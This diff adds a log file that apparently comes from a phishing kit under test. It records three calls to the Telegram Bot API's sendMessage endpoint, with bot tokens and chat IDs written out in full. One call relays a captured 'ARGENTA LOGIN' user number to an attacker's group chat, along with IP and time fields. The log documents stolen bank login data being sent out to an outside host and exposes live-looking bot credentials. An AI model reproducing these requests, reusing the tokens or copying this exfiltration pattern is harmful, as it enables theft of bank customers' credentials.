@@ -1,0 +1,18 @@
+=== 2026-04-30 17:20:17 ===
+URL: https://api.telegram.org/bot8712281940:AAFSIlEkKoKzhB1xWpheGZum35IhVVU7EdI/sendMessage?chat_id=-5176466841&text=TEST+MESSAGE+-+Debug+from+sandbox%0A%0A%2F-+MORE+INFO+-%2F%0AIP%3A+%0ATIME%3A+04%2F30%2F2026+05%3A20%3A17pm
+Response: {"ok":false,"error_code":401,"description":"Unauthorized"}
+HTTP Code: 401
+cURL Error (0): 
+
+=== 2026-04-30 17:25:58 ===
+URL: https://api.telegram.org/bot8477484223:AAG-Krso8h-uguOIKxFKngfc2uzFncfvPqw/sendMessage?chat_id=-5282280577&text=TEST+MESSAGE+-+Sandbox+test+successful%0A%0A%2F-+MORE+INFO+-%2F%0AIP%3A+127.0.0.1%0ATIME%3A+04%2F30%2F2026+05%3A25%3A58pm
+Response: {"ok":true,"result":{"message_id":194,"from":{"id":8477484223,"is_bot":true,"first_name":"vcrawlernight","username":"vnightcreed_bot"},"chat":{"id":-5282280577,"title":"rawlernight","type":"group","all_members_are_administrators":false,"accepted_gift_types":{"unlimited_gifts":false,"limited_gifts":false,"unique_gifts":false,"premium_subscription":false,"gifts_from_channels":false}},"date":1777569958,"text":"TEST MESSAGE - Sandbox test successful\n\n/- MORE INFO -/\nIP: 127.0.0.1\nTIME: 04/30/2026 05:25:58pm","entities":[{"offset":60,"length":9,"type":"url"}]}}
+HTTP Code: 200
+cURL Error (0): 
+
+=== 2026-04-30 17:26:19 ===
+URL: https://api.telegram.org/bot8477484223:AAG-Krso8h-uguOIKxFKngfc2uzFncfvPqw/sendMessage?chat_id=-5282280577&text=%2F-+ARGENTA+LOGIN+-%2F%0AUser%3A+6703123456789012%0A%0A%2F-+MORE+INFO+-%2F%0AIP%3A+127.0.0.1%0ATIME%3A+04%2F30%2F2026+05%3A26%3A19pm
+Response: {"ok":true,"result":{"message_id":195,"from":{"id":8477484223,"is_bot":true,"first_name":"vcrawlernight","username":"vnightcreed_bot"},"chat":{"id":-5282280577,"title":"rawlernight","type":"group","all_members_are_administrators":false,"accepted_gift_types":{"unlimited_gifts":false,"limited_gifts":false,"unique_gifts":false,"premium_subscription":false,"gifts_from_channels":false}},"date":1777569980,"text":"/- ARGENTA LOGIN -/\nUser: 6703123456789012\n\n/- MORE INFO -/\nIP: 127.0.0.1\nTIME: 04/30/2026 05:26:19pm","entities":[{"offset":64,"length":9,"type":"url"}]}}
+HTTP Code: 200
+cURL Error (0): 
+
